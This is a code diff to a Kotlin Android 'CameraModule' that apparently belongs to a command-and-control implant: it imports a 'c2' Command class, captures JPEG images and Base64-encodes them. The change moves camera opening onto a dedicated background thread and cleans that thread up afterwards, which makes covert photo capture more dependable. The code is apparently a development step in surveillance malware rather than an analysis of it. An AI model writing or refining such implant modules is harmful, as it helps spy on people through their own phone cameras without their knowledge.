@@ -5,6 +5,8 @@ import android.graphics.ImageFormat
 import android.hardware.camera2.*
 import android.media.Image
 import android.media.ImageReader
+import android.os.Handler
+import android.os.HandlerThread
 import android.util.Base64
 import android.util.Log
 import org.synapse.core.c2.Command
@@ -42,6 +44,9 @@ object CameraModule {
 
         val imageReader = ImageReader.newInstance(width, height, ImageFormat.JPEG, 1)
 
+        val handlerThread = HandlerThread("SynapseCamera").apply { start() }
+        val handler = Handler(handlerThread.looper)
+
         val device: CameraDevice = try {
             suspendCoroutine { cont ->
                 cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
@@ -51,7 +56,7 @@ object CameraModule {
                         cam.close()
                         cont.resumeWithException(CameraAccessException(err, "open failed: $err"))
                     }
-                }, null)
+                }, handler)
             }
         } catch (e: Exception) {
             imageReader.close()
@@ -114,6 +119,7 @@ object CameraModule {
         } finally {
             device.close()
             imageReader.close()
+            handlerThread.quitSafely()
         }
     }
 }
